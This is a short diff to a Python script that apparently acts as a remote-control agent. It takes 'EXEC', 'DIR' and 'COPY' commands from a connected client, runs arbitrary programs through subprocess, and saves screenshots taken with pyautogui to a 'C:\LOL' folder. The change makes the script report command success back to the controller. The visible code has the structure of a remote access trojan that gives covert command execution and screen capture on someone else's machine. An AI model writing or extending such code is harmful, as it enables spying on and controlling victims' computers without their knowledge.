@@ -10,6 +10,7 @@ def error(e):
 def execute(name):
     try:
         subprocess.call(name)
+        return "success"
     except Exception as e:
         error(e)
 
@@ -55,7 +56,6 @@ def screen_shootin():
     try:
         scrien = pyautogui.screenshot()
         scrien.save("C:\LOL\screenshot.png")
-        send("success")
         return "C:\LOL\screenshot.png"
     except Exception as e:
         error(e)
@@ -78,7 +78,7 @@ while True:
     print("client sent " + data)
     data = data.split()
     if data[0].upper() == "EXEC":
-        execute(data[1])
+        send(execute(data[1]))
     elif data[0].upper() == "DIR":
         send(dir(data[1]))
     elif data[0].upper() == "COPY":
